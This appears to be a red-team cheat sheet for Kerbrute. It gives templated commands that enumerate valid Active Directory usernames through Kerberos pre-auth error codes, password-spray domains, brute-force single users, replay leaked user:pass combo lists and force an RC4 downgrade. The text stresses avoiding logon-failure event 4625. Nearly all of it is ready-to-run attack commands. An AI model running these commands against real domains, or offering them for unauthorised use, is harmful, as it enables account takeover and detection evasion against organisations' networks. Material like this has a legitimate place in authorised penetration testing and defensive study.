# Kerbrute
> Fast Kerberos pre-auth brute tool: enumerate valid usernames and password-spray AD without tripping NTLM logon-failure events (no 4625).

<!-- tags: ad,kerbrute,kerberos,pre-auth,spray,enum -->

---

## enumerate users kerberos
Validate which usernames exist by abusing Kerberos pre-auth error codes (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED). Filters out non-hits.

```bash
kerbrute userenum {{USERLIST:wordlist:users.txt}} -d {{DOMAIN:domain:corp.local}} --dc {{DC_IP:ip:10.10.10.1}} -v --safe -o {{OUT:file:kerb-users.txt}} | grep -v "User does not exist"
```

<!-- meta: risk=low | phase=enum | tags=kerberos,userenum,pre-auth -->

---

## password spray kerberos
Spray a single password across a userlist via Kerberos pre-auth. No event 4625 on most targets since the auth never reaches NTLM.

```bash
kerbrute passwordspray {{USERLIST:wordlist:users.txt}} -d {{DOMAIN:domain:corp.local}} {{PASSWORD:str:Spring2025!}} --dc {{DC_IP:ip:10.10.10.1}} -v --safe -o {{OUT:file:spray-results.txt}}
```

<!-- meta: risk=med | phase=enum | tags=kerberos,spray,pre-auth -->

---

## brute one user password list
Single-user password brute (opposite shape of passwordspray). One target user, many passwords. Use when you've enumerated a valid user and want to guess their password.

```bash
kerbrute bruteuser -d {{DOMAIN:domain}} --dc {{DC_IP:ip}} {{WORDLIST:file:/usr/share/wordlists/rockyou.txt}} {{USERNAME:str}} --safe -o {{OUT:file:brute-user.txt}}
```

<!-- meta: risk=medium | phase=attack | tags=kerbrute,bruteuser,single-user,brute -->

---

## brute combo user pass file
Direct user:pass combo file mode — for a leaked credential dump. One combo per line, format user:pass.

```bash
kerbrute bruteforce -d {{DOMAIN:domain}} --dc {{DC_IP:ip}} {{COMBOLIST:file:userpass.txt}} --safe -o {{OUT:file:combo-brute.txt}}
```

<!-- meta: risk=medium | phase=attack | tags=kerbrute,bruteforce,combo,leak -->

---

## passwordspray rc4 downgrade legacy
RC4 downgrade for legacy DCs / broken AES ticket handling. Rare but the one time you need it, you really need it.

```bash
kerbrute passwordspray -d {{DOMAIN:domain}} --dc {{DC_IP:ip}} --downgrade {{USERLIST:file:users.txt}} {{PASSWORD:str:Winter2024!}} --safe -o {{OUT:file:spray-rc4.txt}}
```

<!-- meta: risk=medium | phase=attack | tags=kerbrute,passwordspray,rc4,downgrade,legacy -->
